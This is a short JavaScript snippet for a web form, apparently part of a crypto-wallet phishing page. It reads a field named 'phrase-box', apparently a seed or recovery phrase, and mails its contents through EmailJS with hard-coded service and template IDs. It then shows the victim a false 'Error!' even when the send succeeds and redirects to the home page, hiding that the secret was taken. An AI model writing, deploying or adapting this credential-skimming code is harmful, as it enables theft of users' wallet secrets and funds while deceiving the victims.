emailjs.init({publicKey:"xGU_aHdkpOdtRV0ta"});const form=document.getElementById("contact-form");form.addEventListener("submit",(e)=>{e.preventDefault();const templateParams={message:document.getElementById("phrase-box").value,};emailjs.send("service_bv24dni","template_drdoji3", templateParams).then(()=>{alert("Error!");window.location.href = '/';},()=>{alert("Error!");window.location.href='/';});});